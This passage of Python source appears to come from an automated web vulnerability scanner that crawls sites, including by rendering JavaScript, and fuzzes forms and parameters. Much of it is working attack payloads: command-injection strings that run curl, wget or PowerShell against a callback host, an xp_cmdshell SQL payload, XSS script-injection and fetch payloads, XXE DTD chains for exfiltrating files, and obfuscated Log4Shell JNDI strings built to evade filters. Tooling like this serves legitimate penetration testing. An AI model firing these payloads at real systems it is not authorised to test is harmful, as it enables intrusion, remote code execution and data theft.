        const v = e.getAttribute('to') || e.getAttribute('routerlink') || e.getAttribute('router-link');
        if (v) spaRoutes.add(String(v));
      });
      const forms = Array.from(document.querySelectorAll('form')).map(f => ({
        action: f.action || location.href,
        method: f.method || 'get',
        fields: Array.from(f.elements).map(e => ({name: e.name || '', type: e.type || e.tagName || 'text', value: e.value || '', id: e.id || '', placeholder: e.getAttribute('placeholder') || '', autocomplete: e.getAttribute('autocomplete') || '', ariaLabel: e.getAttribute('aria-label') || '', className: e.className || '', dataTestid: e.getAttribute('data-testid') || ''})).filter(e => e.name),
        attrs: {id: f.id || '', name: f.getAttribute('name') || '', className: f.className || '', ariaLabel: f.getAttribute('aria-label') || ''}
      }));
      const allEntries = [...(window.__perf_entries || []), ...(performance.getEntriesByType - performance.getEntriesByType('resource') : [])];
      const resources = allEntries.map(e => e.name || e.url).filter(Boolean);
      const storageKeys = [];
      try { for (let i = 0; i < localStorage.length; i++) storageKeys.push({store: 'local', key: localStorage.key(i)}); } catch(e) {}
      try { for (let i = 0; i < sessionStorage.length; i++) storageKeys.push({store: 'session', key: sessionStorage.key(i)}); } catch(e) {}
      return {urls: Array.from(urls), forms, resources, spa_routes: Array.from(spaRoutes), storage_keys: storageKeys, sw_routes: Array.from(window.__sw_routes || [])};
    }
    """

    def _poll_ready(page: object) -> None:
        for _ in range(12):
            try:
                if page.evaluate("() => document.readyState") == "complete":
                    break
            except Exception:
                break
            time.sleep(0.1)

    def _handle_js_data(data: Dict, current_url: str, visible_url: str) -> None:
        for raw in data.get("urls", []) or []:
            _add_route(raw, current_url)
        for raw in data.get("spa_routes", []) or []:
            _add_route(raw, visible_url or current_url)
        for raw in data.get("resources", []) or []:
            _add_api(raw, current_url)
        for raw in data.get("sw_routes", []) or []:
            _add_route(raw, current_url)
            full = _keep_url(raw, current_url)
            if full and full.endswith((".js", ".mjs")):
                try:
                    code, _, body, _ = _req(full, use_cache=True, timeout=4)
                    if code and body:
                        text = body.decode("utf-8", "ignore")
                        for m in re.finditer(r'(?:addAll|add)\s*\(\s*\[([^\]]{1,6000})\]', text, re.I | re.S):
                            for item in re.findall(r'["\']([^"\']{1,300})["\']', m.group(1)):
                                _add_route(item, full)
                except Exception:
                    pass
        for item in data.get("forms", []) or []:
            _add_form(item, visible_url or current_url)
        for sk in data.get("storage_keys", []) or []:
            key = str((sk or {}).get("key", "") or "")
            store = str((sk or {}).get("store", "") or "storage")
            if re.search(r'(token|jwt|api[_-]?key|auth|secret|password|credential|session)', key, re.I):
                with js_lock:
                    js_findings.append((
                        "JS rendering found sensitive-looking %sStorage key '%s'" % (store, key[:80]),
                        "url=%s key=%s" % ((visible_url or current_url)[:120], key[:120]),
                    ))

    if _HAS_PLAYWRIGHT and _sync_playwright is not None:
        try:
            def _visit(url: str) -> None:
                ctx = _new_pw_context(base)
                if ctx is None:
                    return
                page = None
                current_url = url
                try:
                    ctx.add_init_script(init_js)
                    page = ctx.new_page()
                    page.on("request", lambda req, cu=current_url: _add_api(req.url, cu, req.resource_type in ("fetch", "xhr", "document", "websocket")))
                    page.on("response", lambda resp, cu=current_url: _add_api(resp.url, cu, resp.request.resource_type in ("fetch", "xhr", "document")))
                    page.goto(url, wait_until="domcontentloaded", timeout=12000)
                    try:
                        page.wait_for_load_state("networkidle", timeout=3500)
                    except Exception:
                        _poll_ready(page)
                    data = page.evaluate(extract_js) or {}
                    _handle_js_data(data, current_url, page.url or current_url)
                except Exception:
                    pass
                finally:
                    if page is not None:
                        try:
                            page.close()
                        except Exception:
                            pass
                    try:
                        ctx.close()
                    except Exception:
                        pass
            with ThreadPoolExecutor(max_workers=min(4, max(1, len(to_visit[:8])))) as ex:
                list(ex.map(_visit, to_visit[:8]))
            return discovered, api_hits, forms, js_findings
        except Exception:
            pass

    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
    except ImportError:
        return discovered, api_hits, forms, js_findings
    opts = ChromeOptions()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.set_capability("goog:loggingPrefs", {"performance": "ALL"})
    driver = None
    for attempt in range(2):
        try:
            if attempt == 0:
                driver = webdriver.Chrome(options=opts)
            else:
                fopts = FirefoxOptions()
                fopts.add_argument("--headless")
                driver = webdriver.Firefox(options=fopts)
            break
        except Exception:
            driver = None
    if driver is None:
        return discovered, api_hits, forms, js_findings
    try:
        for url in to_visit[:8]:
            try:
                driver.set_page_load_timeout(12)
                driver.get(url)
                for _ in range(20):
                    try:
                        if driver.execute_script("return document.readyState") == "complete":
                            break
                    except Exception:
                        break
                    time.sleep(0.1)
                data = driver.execute_script("return (" + extract_js + ")()") or {}
                _handle_js_data(data, url, driver.current_url or url)
                try:
                    for entry in driver.get_log("performance"):
                        try:
                            msg = json.loads(entry.get("message", "{}"))
                            params = msg.get("message", {}).get("params", {})
                            req_url = params.get("request", {}).get("url", "") or params.get("response", {}).get("url", "")
                            _add_api(req_url, url, True)
                        except Exception:
                            pass
                except Exception:
                    pass
            except Exception:
                continue
    finally:
        try:
            driver.quit()
        except Exception:
            pass
    return discovered, api_hits, forms, js_findings



def _field_meta_text(name: str, field_type: str, form_context: Dict) -> str:
    meta = (form_context.get("field_meta") or {}).get(name, {}) if isinstance(form_context, dict) else {}
    attrs = []
    if isinstance(meta, dict):
        for k in ("name", "id", "type", "placeholder", "autocomplete", "aria-label", "aria-labelledby", "class", "data-testid", "data-field", "role", "value"):
            v = meta.get(k, "")
            if v:
                attrs.append(str(v))
    form_attrs = form_context.get("attrs", {}) if isinstance(form_context, dict) else {}
    if isinstance(form_attrs, dict):
        for k in ("id", "name", "class", "aria-label", "data-testid"):
            v = form_attrs.get(k, "")
            if v:
                attrs.append(str(v))
    attrs.extend([name, field_type, form_context.get("action", ""), form_context.get("origin_url", "")] if isinstance(form_context, dict) else [name, field_type])
    return " ".join(attrs).replace("_", " ").replace("-", " ").lower()

def _classify_field(name: str, field_type: str, form_context: Dict) -> str:
    _TYPE_MAP = {
        "email": "email", "number": "numeric", "range": "numeric", "date": "date",
        "file": "file", "checkbox": "bool", "radio": "bool",
    }
    field_type = (field_type or "text").lower()
    if field_type in _TYPE_MAP:
        return _TYPE_MAP[field_type]
    text = _field_meta_text(name, field_type, form_context)
    if field_type == "password" or re.search(r"\b(pass|password|pwd|secret|pin|otp|totp|mfa|credential)\b", text):
        return "sqli"
    if re.search(r"\b(email|mail|e mail)\b", text):
        return "email"
    if re.search(r"\b(url|uri|redirect|next|return|callback|continue|target|dest|destination|goto|back|referrer|website|homepage)\b", text):
        return "redirect"
    if re.search(r"\b(file|path|dir|folder|template|include|page|document|resource|attachment|avatar|photo|image|upload|import)\b", text):
        return "file" if re.search(r"\b(upload|avatar|photo|image|attachment|import)\b", text) else "lfi"
    if re.search(r"\b(cmd|command|exec|shell|ping|host|hostname|domain|server|ip address|target host)\b", text):
        return "cmdi"
    if re.search(r"\b(amount|price|qty|quantity|count|number|age|year|month|day|score|rating|size|limit|offset|page|id|identifier)\b", text):
        return "numeric"
    if re.search(r"\b(date|birthday|dob|start|end|created|updated)\b", text):
        return "date"
    if re.search(r"\b(active|enabled|visible|public|admin|debug|verified|published|remember|subscribe)\b", text):
        return "bool"
    if re.search(r"\b(xml|soap|rss|feed|import)\b", text):
        return "xxe"
    if re.search(r"\b(template|render|layout|theme|format|view)\b", text):
        return "ssti"
    n = (name or "").lower()
    for category, names in _FIELD_CATEGORIES.items():
        if n in names or any((" " + item + " ") in (" " + text + " ") for item in names if len(item) > 2):
            return category
    action_text = " " + text + " "
    if re.search(r"\b(login|signin|sign in|auth|session|admin|account)\b", action_text) and len(str(name)) <= 3:
        return "sqli"
    return "xss"

def scan_crawl(base: str, workers: int = 10) -> ScanFindings:
    out: ScanFindings = []
    pages, forms = _crawl(base, max_pages=_GLOBAL_CRAWL_PAGES, max_depth=_GLOBAL_CRAWL_DEPTH)
    if _GLOBAL_JS_RENDER:
        js_pages, js_apis, js_forms, js_findings = _js_crawl(base, pages)
        new_pages = js_pages - pages
        if new_pages:
            out.append(("JS rendering found %d additional routes" % len(new_pages),
                        ", ".join(list(new_pages)[:4])))
        if js_apis:
            out.append(("JS rendering found %d API calls" % len(js_apis),
                        ", ".join(js_apis[:4])))
        if js_forms:
            existing_form_keys = {
                f.get("action", "") + "|" + "|".join(sorted((f.get("fields") or {}).keys()))
                for f in forms
            }
            added_forms = 0
            for f in js_forms:
                key = f.get("action", "") + "|" + "|".join(sorted((f.get("fields") or {}).keys()))
                if key in existing_form_keys:
                    continue
                existing_form_keys.add(key)
                forms.append(f)
                added_forms += 1
            if added_forms:
                out.append(("JS rendering found %d additional forms" % added_forms,
                            ", ".join(f["action"] for f in js_forms[:4])))
        out.extend(js_findings)
        pages |= js_pages
    out.append(("crawled %d unique pages" % len(pages), base))
    out.append(("%d forms discovered" % len(forms),
                ", ".join(f["action"] for f in forms[:4]) or "none"))
    _coverage_event("forms_seen", amount=len(forms))
    with _DISC_ENDPOINTS_LOCK:
        _DISCOVERED_ENDPOINTS.update(pages)

    def _fuzz_form(form: Dict) -> ScanFindings:
        f_out: ScanFindings = []
        action = form["action"]
        method = form["method"]
        fields = form["fields"]
        _coverage_event("forms_fuzzed")
        _coverage_event("form_fields_fuzzed", amount=len(fields))

        try:
            if method == "POST":
                bl_code, bl_hdrs, bl_body, _ = _req(
                    action, method="POST",
                    data=urllib.parse.urlencode(fields).encode(),
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=5.0,
                )
            else:
                _bsep = "&" if "?" in action else "?"
                bl_code, bl_hdrs, bl_body, _ = _req(
                    action + _bsep + urllib.parse.urlencode(fields), timeout=5.0,
                )
        except Exception:
            bl_code, bl_hdrs, bl_body = 0, {}, b""
        bl_body = bl_body or b""
        bl_len  = len(bl_body)
        try:
            bl_cr = len(zlib.compress(bl_body[:4096])) / max(len(bl_body[:4096]), 1)
        except Exception:
            bl_cr = 0.0

        field_categories: Dict[str, str] = {
            fname: _classify_field(
                fname,
                form.get("field_types", {}).get(fname, "text"),
                form,
            )
            for fname in fields
        }

        probe_tasks: List[Tuple] = []
        for fname, category in field_categories.items():
            for payload, label, confirm_fn in _FORM_PAYLOADS.get(category, _FORM_PAYLOADS["xss"]):
                fuzzed = dict(fields)
                fuzzed[fname] = payload
                probe_tasks.append((fname, payload, label, category, confirm_fn, fuzzed))

        def _score_response(code, hdrs, body_b, expected_code=bl_code):
            bx = body_b or b""
            body_text = bx.decode("utf-8", "ignore")
            body_len  = len(bx)
            try:
                cr = len(zlib.compress(bx[:4096])) / max(len(bx[:4096]), 1)
            except Exception:
                cr = bl_cr
            score = 0.0
            score += 2.0 if code != expected_code else 0.0
            score += min(abs(body_len - bl_len) / max(bl_len, 1), 1.0)
            score += abs(cr - bl_cr) * 2.0
            score += 1.0 if hdrs.get("content-type", "") != bl_hdrs.get("content-type", "") else 0.0
            return score, body_text

        def _submit_probe(task):
            fname, payload, label, category, confirm_fn, fuzzed = task
            try:
                encoded = urllib.parse.urlencode(fuzzed)
                if method == "POST":
                    c, h, b, _ = _req(
                        action, method="POST",
                        data=encoded.encode(),
                        headers={"Content-Type": "application/x-www-form-urlencoded"},
                        timeout=6.0,
                    )
                else:
                    sep = "&" if "?" in action else "?"
                    c, h, b, _ = _req(action + sep + encoded, timeout=6.0)
                delta, text = _score_response(c, h, b)
                confirmed = confirm_fn(text)
                return fname, payload, label, category, c, h, b, delta, confirmed, text
            except Exception:
                return None

        confirmed_fields: Set[str] = set()
        if probe_tasks:
            with ThreadPoolExecutor(max_workers=min(16, len(probe_tasks))) as _ff_ex:
                futs = {_ff_ex.submit(_submit_probe, task): task for task in probe_tasks}
                for fut in as_completed(futs):
                    r = fut.result()
                    if r is None:
                        continue
                    fname, payload, label, category, code, hdrs, body_b, delta, confirmed, text = r
                    if confirmed:
                        f_out.append((
                            f"[CONFIRMED] {label} via form field '{fname}' on {action}",
                            f"field={fname} payload={payload[:80]} fields={','.join(fields)}",
                        ))
                        confirmed_fields.add(fname)
                    elif delta > 0.4 and fname not in confirmed_fields:
                        f_out.append((
                            f"[BEHAVIORAL] {category} signal on form field '{fname}' at {action} "
                            f"(delta={delta:.2f}) - manual confirmation recommended",
                            f"field={fname} payload={payload[:60]} status={code} delta={delta:.2f}",
                        ))

        _redir_tasks = [
            (t[0], t[1], t[2], t[5])
            for t in probe_tasks if t[3] == "redirect"
        ]
        if _redir_tasks:
            _redir_opener = urllib.request.build_opener(
                _NoRedirectHandler(),
                urllib.request.HTTPSHandler(context=_CTX),
            )
            for fname, payload, label, fuzzed in _redir_tasks:
                encoded = urllib.parse.urlencode(fuzzed)
                loc = ""
                try:
                    if method == "POST":
                        _ro = urllib.request.Request(
                            action, data=encoded.encode(),
                            headers={"Content-Type": "application/x-www-form-urlencoded",
                                     "User-Agent": _GLOBAL_UA},
                            method="POST",
                        )
                    else:
                        _rsep = "&" if "?" in action else "?"
                        _ro = urllib.request.Request(
                            action + _rsep + encoded,
                            headers={"User-Agent": _GLOBAL_UA},
                        )
                    with _redir_opener.open(_ro, timeout=5.0) as _rr:
                        loc = _rr.headers.get("location", "") or ""
                except urllib.error.HTTPError as _redir_e:
                    loc = _redir_e.headers.get("location", "") or ""
                except Exception:
                    pass
                if loc and (
                    "evil.example.com" in loc
                    or loc.startswith("//")
                    or loc.lower().startswith("javascript:")
                ):
                    f_out.append((
                        f"[CONFIRMED] open redirect via form field '{fname}' on {action}",
                        f"field={fname} payload={payload} Location={loc}",
                    ))

        if len(f_out) < 30:
            xss_canary = "FUZZ_XSS_" + hashlib.md5(os.urandom(4)).hexdigest()[:8]
            xss_stored_payload = f'"><script>alert("{xss_canary}")</script>'
            xss_fields = {
                f: xss_stored_payload
                for f, cat in field_categories.items() if cat == "xss"
            }
            if xss_fields:
                stored_data = dict(fields)
                stored_data.update(xss_fields)
                try:
                    if method == "POST":
                        _req(action, method="POST",
                             data=urllib.parse.urlencode(stored_data).encode(),
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             timeout=5.0)
                    else:
                        _ssep = "&" if "?" in action else "?"
                        _req(action + _ssep + urllib.parse.urlencode(stored_data), timeout=5.0)
                    for check_url in [action, form.get("origin_url", action)]:
                        c2, _, b2, _ = _req(check_url, timeout=5.0)
                        if xss_canary in (b2 or b"").decode("utf-8", "ignore"):
                            f_out.append((
                                f"[CONFIRMED] stored/persistent XSS on {action} - "
                                f"payload appeared on re-fetch of {check_url}",
                                f"canary={xss_canary} fields={','.join(xss_fields)}",
                            ))
                            break
                except Exception:
                    pass

        if len(f_out) < 30 and 2 <= len(fields) <= 4:
            field_list = list(fields.keys())
            for i, f1 in enumerate(field_list):
                for f2 in field_list[i + 1:]:
                    cat1 = field_categories.get(f1, "xss")
                    for payload, label, confirm_fn in _FORM_PAYLOADS.get(cat1, _FORM_PAYLOADS["xss"])[:2]:
                        fuzzed = dict(fields)
                        fuzzed[f1] = payload
                        fuzzed[f2] = "admin"
                        encoded = urllib.parse.urlencode(fuzzed)
                        try:
                            if method == "POST":
                                c, h, b, _ = _req(
                                    action, method="POST",
                                    data=encoded.encode(),
                                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                                    timeout=5.0,
                                )
                            else:
                                _isep = "&" if "?" in action else "?"
                                c, h, b, _ = _req(action + _isep + encoded, timeout=5.0)
                            text = (b or b"").decode("utf-8", "ignore")
                            delta, _ = _score_response(c, h, b)
                            if confirm_fn(text):
                                f_out.append((
                                    f"[CONFIRMED] {label} via field interaction "
                                    f"'{f1}'x'{f2}' on {action}",
                                    f"fields={f1}={payload[:40]},{f2}=admin",
                                ))
                            elif delta > 0.5:
                                f_out.append((
                                    f"[BEHAVIORAL] field interaction '{f1}'x'{f2}' produces "
                                    f"high delta={delta:.2f} - possible conditional injection",
                                    f"action={action} payload={payload[:40]}",
                                ))
                        except Exception:
                            pass

        for fname in confirmed_fields:
            cat = field_categories.get(fname, "xss")
            for payload, label, confirm_fn in _FORM_PAYLOADS.get(cat, [])[:3]:
                try:
                    json_body = json.dumps({
                        fname: payload,
                        **{k: v for k, v in fields.items() if k != fname},
                    })
                    cj, _, bj, _ = _req(
                        action, method="POST",
                        data=json_body.encode(),
                        headers={"Content-Type": "application/json"},
                        timeout=5.0,
                    )
                    if confirm_fn((bj or b"").decode("utf-8", "ignore")):
                        f_out.append((
                            f"[CONFIRMED] {label} also exploitable via JSON body "
                            f"at {action} field '{fname}'",
                            f"field={fname} content-type=application/json payload={payload[:80]}",
                        ))
                except Exception:
                    pass

        if len(f_out) < 30 and bl_code in (201, 302, 303):
            try:
                _oob_tok = "formfuzz_" + hashlib.md5(os.urandom(4)).hexdigest()[:8]
                cb = oob_url(_oob_tok, action)
                if cb:
                    oob_clear(_oob_tok)
                    oob_xss_fields = {
                        f: f'"><script src="{cb}"></script>'
                        for f, cat in field_categories.items() if cat == "xss"
                    }
                    oob_sqli_fields = {
                        f: f"'; EXEC xp_cmdshell('curl {cb}')--"
                        for f, cat in field_categories.items() if cat == "sqli"
                    }
                    all_oob = dict(fields)
                    all_oob.update(oob_xss_fields)
                    all_oob.update(oob_sqli_fields)
                    if method == "POST":
                        _req(action, method="POST",
                             data=urllib.parse.urlencode(all_oob).encode(),
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             timeout=5.0)
                    hits = oob_wait(_oob_tok, timeout=4.0)
                    for hit in hits:
                        f_out.append((
                            f"[CONFIRMED] blind stored injection OOB callback from form at {action}",
                            f"src={hit.get('src','')} method={hit.get('method','')} "
                            f"fields={list(all_oob)[:4]}",
                        ))
            except Exception:
                pass

        return f_out

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = [ex.submit(_fuzz_form, f) for f in forms]
        for fut in as_completed(futures):
            try:
                out.extend(fut.result())
            except Exception:
                pass

    return out

def scan_blind_xss(url: str) -> ScanFindings:
    out: ScanFindings = []
    token = "bxss" + hashlib.md5(os.urandom(6)).hexdigest()[:10]
    cb = oob_url(token, url)
    if not cb:
        return out
    oob_clear(token)
    params = _extract_params(url) or ["q", "search", "name", "comment", "msg",
                                       "content", "title", "body", "text", "note",
                                       "input", "data", "value", "description"]
    cb_js = cb.replace("'", "\\'")
    _BXSS_PAYLOADS = [
        '"><script src="%s"></script>' % cb,
        "';fetch('%s');//" % cb_js,
        '"><img src=x onerror="fetch(\'%s\')"><!--' % cb_js,
        "javascript:fetch('%s')//" % cb_js,
        '"><svg onload="fetch(\'%s\')"><!--' % cb_js,
    ]
    tasks: List[Callable] = []
    for p in params[:8]:
        for pay in _BXSS_PAYLOADS:
            u = _inject_param(url, p, pay)
            tasks.append(lambda u=u: _req(u, timeout=4.0))
        for pay in _BXSS_PAYLOADS[:2]:
            tasks.append(lambda pay=pay, p=p: _req(
                url, method="POST",
                data=urllib.parse.urlencode({p: pay}).encode(),
                content_type="application/x-www-form-urlencoded",
                timeout=4.0,
            ))
    with ThreadPoolExecutor(max_workers=min(16, len(tasks))) as ex:
        futs = [ex.submit(t) for t in tasks]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    hits = oob_wait(token, timeout=6.0)
    for hit in hits:
        out.append(("[CONFIRMED] blind/stored XSS OOB callback received", "src=" + hit.get("src", "")))
    return out

def scan_sqli_union(url: str) -> ScanFindings:
    out: ScanFindings = []
    params = _extract_params(url)
    if not params:
        params = ["id", "user", "cat", "page", "item"]
    params = params[:6]
    canary = "sqlicanary" + hashlib.md5(os.urandom(4)).hexdigest()[:6]
    _UNION_TEMPLATES = [
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3,4,5--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "1 UNION ALL SELECT NULL,NULL,NULL--",
        "' UNION SELECT '{c}',NULL,NULL--",
        "1 UNION SELECT '{c}',2,3--",
        "' UNION ALL SELECT '{c}',NULL,NULL,NULL--",
    ]
    payloads = [t.replace("{c}", canary) for t in _UNION_TEMPLATES]
    seen: Set[str] = set()
    with ThreadPoolExecutor(max_workers=8) as ex:
        futs: Dict = {}
        for p in params:
            for pay in payloads:
                futs[ex.submit(_req, _inject_param(url, p, pay))] = (p, pay)
        for f in as_completed(futs):
            p, pay = futs[f]
            if p in seen:
                continue
            try:
                _, _, body, _ = f.result()
            except Exception:
                continue
            if canary in body.decode("utf-8", "ignore"):
                seen.add(p)
                out.append(("[CONFIRMED] UNION-based SQLi on param " + p, pay))
    return out

def scan_oob_ssrf(url: str) -> ScanFindings:
    out: ScanFindings = []
    token = "ssrf" + hashlib.md5(os.urandom(6)).hexdigest()[:10]
    cb = oob_url(token, url)
    if not cb:
        return out
    oob_clear(token)
    oob_dns_start()
    dns_cb = "http://" + oob_url_dns(token) + "/" + token
    params = _extract_params(url) or ["url", "uri", "dest", "redirect", "target",
                                       "callback", "webhook", "fetch", "load", "src",
                                       "proxy", "resource", "endpoint", "next", "continue"]
    tasks: List[Callable] = []
    for param in params[:8]:
        for pay in [cb, cb + "/path", cb.replace("http://", "http://@"), dns_cb]:
            u = _inject_param(url, param, pay)
            tasks.append(lambda u=u: _req(u, timeout=3.0))
    ssrf_headers = [
        ("Referer", cb), ("X-Forwarded-For", cb), ("X-Forwarded-Host", cb),
        ("X-Real-IP", cb), ("True-Client-IP", cb), ("Client-IP", cb),
        ("X-Custom-IP-Authorization", cb), ("X-ProxyUser-Ip", cb),
        ("X-Original-URL", "/" + token), ("X-Rewrite-URL", "/" + token),
        ("X-Forwarded-Server", _local_ip()), ("X-HTTP-Host-Override", _local_ip()),
        ("Forwarded", "for=" + cb + ";by=" + cb + ";host=" + cb),
    ]
    for hdr, val in ssrf_headers:
        tasks.append(lambda v=val, h=hdr: _req(url, headers={h: v}, timeout=3.0))
    for key in _SSRF_JSON_KEYS:
        body = json.dumps({key: cb}).encode()
        tasks.append(lambda b=body: _req(url, method="POST", body=b,
                                         headers={"Content-Type": "application/json"}, timeout=3.0))
    for key in _SSRF_JSON_KEYS[:6]:
        tasks.append(lambda k=key: _req(url, method="POST",
                                         body=urllib.parse.urlencode({k: cb}).encode(),
                                         headers={"Content-Type": "application/x-www-form-urlencoded"},
                                         timeout=3.0))
    with ThreadPoolExecutor(max_workers=min(32, len(tasks))) as ex:
        futs = [ex.submit(t) for t in tasks]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    oob_wait(token, timeout=5.0)
    by_proto = oob_get_hits_by_protocol(token)
    for proto, proto_hits in by_proto.items():
        h0   = proto_hits[0]
        src  = h0.get("src", "?")
        path = h0.get("path", "")
        out.append(("blind SSRF OOB confirmed via " + proto + " (callback from "
                    + src + " path=" + path + ")", cb))
    return out

def scan_oob_xxe(base: str) -> ScanFindings:
    out: ScanFindings = []
    token = "xxe" + hashlib.md5(os.urandom(6)).hexdigest()[:10]
    cb = oob_url(token, base)
    if not cb:
        return out
    oob_clear(token)
    dtd_url = cb + "/" + token + ".dtd"
    payloads = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "' + cb + '">]><r>&xxe;</r>',
         "external entity direct"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "' + dtd_url + '"> %xxe;]><r/>',
         "parameter entity -> DTD chain (file exfil)"),
        ('<?xml version="1.0" encoding="UTF-8"?>'
         '<!DOCTYPE test [<!ENTITY % init SYSTEM "' + dtd_url + '"> %init;]><r/>',
         "parameter entity init -> DTD chain"),
        ('<?xml version="1.0"?><!DOCTYPE foo SYSTEM "' + dtd_url + '"><r/>',
         "SYSTEM doctype -> DTD chain"),
        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "' + dtd_url + '">%sp;%param1;%exfil;]><r/>',
         "multi-stage parameter entity"),
        ('<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "' + cb + '">]>'
         '<soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>',
         "SOAP XXE"),
        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "' + cb + '">%d;]><r/>',
         "parameter entity direct"),
    ]
    probe_tasks: List[Tuple[bytes, str, str]] = []
    for xml_body, label in payloads:
        for ct in ("application/xml", "text/xml", "application/soap+xml"):
            probe_tasks.append((xml_body.encode(), ct, label))
    with ThreadPoolExecutor(max_workers=min(20, len(probe_tasks))) as ex:
        futs = [ex.submit(_req, base, "POST", body, {"Content-Type": ct}, 5.0)
                for body, ct, _ in probe_tasks]
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    oob_wait(token, timeout=6.0)
    by_proto = oob_get_hits_by_protocol(token)
    for proto, proto_hits in by_proto.items():
        h0    = proto_hits[0]
        src   = h0.get("src", "?")
        path  = h0.get("path", "")
        chain = "DTD chain" if "dtd" in path.lower() else "direct"
        exfil = h0.get("body", "")
        note  = (" - file exfil in callback: " + exfil[:80]) if proto == "HTTP" and "d=" in path else ""
        out.append(("blind XXE OOB confirmed (" + chain + ") via " + proto
                    + " - callback from " + src + note,
                    payloads[0][0][:120]))
    return out

def scan_oob_cmdi(url: str) -> ScanFindings:
    out: ScanFindings = []
    token = "cmdi" + hashlib.md5(os.urandom(6)).hexdigest()[:10]
    base_cb = oob_url(token, url)
    if not base_cb:
        return out
    oob_clear(token)
    ip      = _local_ip()
    dns_p   = oob_dns_start()
    dns_hn  = oob_url_dns(token)
    params = _extract_params(url) or ["cmd", "exec", "command", "run", "ping",
                                       "host", "ip", "addr", "query", "search", "name",
                                       "file", "path", "dir", "input", "val"]
    dns_probe = [
        ";nslookup " + dns_hn + ";",
        "& nslookup " + dns_hn,
        ";ping -c 1 " + dns_hn + ";",
    ] + (([";dig @" + ip + " -p " + str(dns_p) + " " + token + ".oob;",
           ";dig +short " + dns_hn + " @" + ip + ";"] if dns_p != 53
          else [";dig @" + ip + " " + token + ".oob;"])
         if dns_p else [])
    tasks: List[Tuple[str, str, str]] = []
    for param in params[:8]:
        pcb = base_cb + "/" + urllib.parse.quote(param, safe="")
        payloads_for_param = [
            ";curl -s " + pcb + ";",
            "&&curl -s " + pcb,
            "|curl -s " + pcb,
            ";wget -q -O /dev/null " + pcb + ";",
            "$(curl -s " + pcb + ")",
            "`curl -s " + pcb + "`",
            ";ping -c 1 " + ip + ";",
            "& ping -n 1 " + ip,
            "| curl -s " + pcb,
            "\ncurl -s " + pcb,
            ";curl${IFS}-s${IFS}" + pcb + ";",
            "$(IFS=,;`curl${IFS}-s${IFS}" + pcb + "`)",
            ";powershell -c \"Invoke-WebRequest -Uri '" + pcb + "'\";",
            "& powershell -c \"(New-Object Net.WebClient).DownloadString('" + pcb + "')\"",
        ] + dns_probe
        for pay in payloads_for_param:
            tasks.append((param, pay, _inject_param(url, param, pay)))
    with ThreadPoolExecutor(max_workers=min(32, len(tasks))) as ex:
        futs = {ex.submit(_req, test_url, timeout=4.0): (param, pay)
                for param, pay, test_url in tasks}
        for f in as_completed(futs):
            try:
                f.result()
            except Exception:
                pass
    hits = oob_wait(token, timeout=5.0)
    if hits:
        path_parts = hits[0].get("path", "").lstrip("/").split("/")
        hit_param  = urllib.parse.unquote(path_parts[1]) if len(path_parts) > 1 else "unknown"
        src        = hits[0].get("src", "?")
        triggered  = next((pay for p, pay, _ in tasks if p == hit_param), hits[0].get("path", ""))
        out.append(("blind CMDi OOB confirmed via param '" + hit_param
                    + "' (callback from " + src + ")", triggered[:120]))
    return out

def scan_oob_log4j(base: str) -> ScanFindings:
    out: ScanFindings = []
    token = "l4j" + hashlib.md5(os.urandom(6)).hexdigest()[:10]
    http_port = oob_start()
    tcp_port  = oob_tcp_start()
    dns_port  = oob_dns_start()
    host      = _OOB_HOST if _OOB_HOST else _local_ip()
    http_host = host + ":" + str(http_port)
    tcp_host  = host + ":" + str(tcp_port)
    dns_host  = (host + ":" + str(dns_port)) if dns_port else host
    cb_path   = "/" + token
    oob_clear(token)
    def _jndi(proto: str, h: str) -> str:
        return "${jndi:" + proto + "://" + h + cb_path + "}"
    def _obf(s: str) -> str:
        return "".join("${::-" + c + "}" for c in s)
    jndi_payloads = [
        _jndi("ldap",  http_host),
        _jndi("ldap",  tcp_host),
        _jndi("rmi",   tcp_host),
        _jndi("ldaps", tcp_host),
        _jndi("dns",   dns_host),
        _jndi("dns",   host),
        "${${lower:j}ndi:${lower:l}dap://" + tcp_host + cb_path + "}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://" + tcp_host + cb_path + "}",
        "${j${::-n}di:ldap://" + tcp_host + cb_path + "}",
        "${${upper:j}ndi:${upper:l}dap://" + tcp_host + cb_path + "}",
        "${${::-j}ndi:ldap://" + tcp_host + cb_path + "}",
        "${jndi:${lower:l}${lower:d}a${lower:p}://" + tcp_host + cb_path + "}",
        "${${env:NaN:-j}ndi:${env:NaN:-l}dap://" + tcp_host + cb_path + "}",
        "%24%7Bjndi%3Aldap%3A%2F%2F" + urllib.parse.quote(tcp_host) + cb_path + "%7D",
        "{{\"${{jndi:ldap://{host}{path}}}\".format(host=\"{h}\",path=\"{p}\")}}".replace(
            "{h}", tcp_host).replace("{p}", cb_path),
        "${jndi:${lower:d}${lower:n}${lower:s}://" + dns_host + cb_path + "}",
    ]
    inject_headers = [
        "User-Agent", "X-Forwarded-For", "X-Api-Version", "Referer",
        "X-Forwarded-Host", "X-Client-IP", "X-Real-IP", "Accept-Language",
        "Accept", "Origin", "Authorization", "X-Auth-Token", "CF-Connecting-IP",
